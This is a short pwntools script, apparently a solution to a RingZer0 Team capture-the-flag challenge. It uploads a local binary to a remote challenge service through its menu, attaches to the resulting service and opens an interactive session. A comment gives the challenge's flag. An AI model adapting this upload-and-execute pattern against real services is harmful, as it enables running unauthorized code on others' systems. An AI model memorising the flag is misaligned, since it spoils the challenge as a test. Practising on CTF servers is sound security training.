from pwn import *

# FLAG-SortIsSecureOnlyIfDoneInNC8

with open("data/sorting", "rb") as f:
    binary = f.read()

io = remote("challenges.ringzer0team.com", 10283)

# Start Service
io.sendlineafter(b"ENTER ACTION> ", b"1")
io.sendlineafter(b"ENTER PROGRAM NAME> ", b"abc")
io.sendlineafter(b"ENTER PROGRAM SIZE> ", str(len(binary)).encode())

io.send(binary)

# Attach Service
io.sendlineafter(b"ENTER ACTION> ", b"3")
io.sendlineafter(b"ENTER SERVICE ID> ", b"4")

io.interactive()